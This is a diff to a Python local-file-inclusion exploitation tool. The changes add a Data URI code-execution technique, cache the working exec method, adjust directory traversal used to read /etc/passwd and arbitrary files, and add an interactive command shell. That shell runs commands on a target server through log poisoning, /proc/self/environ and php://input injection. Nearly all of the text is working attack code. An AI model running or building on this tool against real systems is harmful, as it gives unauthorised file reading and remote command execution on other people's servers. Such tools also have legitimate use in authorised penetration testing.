@@ -10,13 +10,14 @@ import urllib
 # LFI techniques
 from core.techniques.LFIHeader import LFIHeader
 from core.techniques.LFIApacheLog import LFIApacheLog
+from core.techniques.LFIDataURI import LFIDataURI
 from core.techniques.LFIPost import LFIPost
 from core.techniques.LFISSHLog import LFISSHLog
 
 # string functions
 from core.functions import *
 
-class LFI ():
+class LFI (object):
     def __init__ (self, original_url, replace = 'PAYLOAD', cookies = ''):
         # url submitted by user
         self.original_url = original_url
@@ -34,6 +35,12 @@ class LFI ():
             self.cookies = dict ()
         else:
             self.load_cookies (cookies)
+
+        # exec method
+        self.exec_method = None
+
+        # read method
+        self.read_method = None
 
         # http method
         self.http_method = 'get'
@@ -214,7 +221,7 @@ class LFI ():
         if len (found_name) == 0:
             return None
         else:
-            self.pattern_url = url
+            self.pattern_url = url + self.path_suffix
             return url
 
     '''
@@ -241,7 +248,7 @@ class LFI ():
         regexp_passwd = re.compile ('root:')
         for count in range (1, max_traversal):
             traversal = '../' * count
-            url = self.pattern_url.replace (self.payload_placeholder, traversal + 'etc/passwd' + self.path_suffix)
+            url = self.pattern_url.replace (self.payload_placeholder, traversal + 'etc/passwd')
             req = requests.get (url, cookies=self.cookies)
             if len (regexp_passwd.findall (req.text)) != 0:
                 self.root_path = traversal
@@ -262,37 +269,70 @@ class LFI ():
         print '[-] php://filter technique failed'
         print '[+] testing direct injection'
         # we don't use path_prefix so we can read any file easily
-        url = self.pattern_url.replace (self.payload_placeholder, filename + self.path_suffix)
+        url = self.pattern_url.replace (self.payload_placeholder, filename)
         print url
         req = requests.get (url, cookies=self.cookies)
         return [req.text]
 
+
     def do_exec (self, cmd):
+        if self.exec_method == None:
+            tech = self.check_exec ()
+            if tech == None:
+                print 'No code exec!'
+                return []
+            else:
+                return tech.exploit (cmd)
+        else:
+            return self.exec_method.exploit (cmd)
+
+    def check_exec (self):
+        print '[+] Testing Data URI command execution'
+        # test /proc/self/environ technique
+        tech = LFIDataURI (self)
+        if tech.check ():
+            self.exec_method = tech
+            return tech
+
         print '[+] Testing /proc/self/environ command execution'
         # test /proc/self/environ technique
         tech = LFIHeader (self)
         if tech.check ():
-            return tech.exploit (cmd)
+            self.exec_method = tech
+            return tech
 
         print '[+] Testing SSH Log command execution'
         # check if we got code execution through SSH logs
         tech = LFISSHLog (self)
         if tech.check ():
-            return tech.exploit (cmd)
+            self.exec_method = tech
+            return tech
 
         print '[+] Testing php://input command execution'
         # test php://input technique
         tech = LFIPost (self)
         if tech.check ():
-            return tech.exploit (cmd)
+            self.exec_method = tech
+            return tech
 
         print '[+] Testing Apache Log command execution'
         # check if we got code execution through apache logs
         tech = LFIApacheLog (self)
         if tech.check ():
-            return tech.exploit (cmd)
+            self.exec_method = tech
+            return tech
 
-        print 'No code exec!'
+        return None
 
-        return [ ]
+    def do_shell (self):
+        result = []
+        while True:
+            cmd = raw_input ('cmd : ')
+            if cmd == 'exit':
+                break
+            # exec cmd
+            results = self.do_exec (cmd)
+            # show output
+            for result in results:
+                print result
 
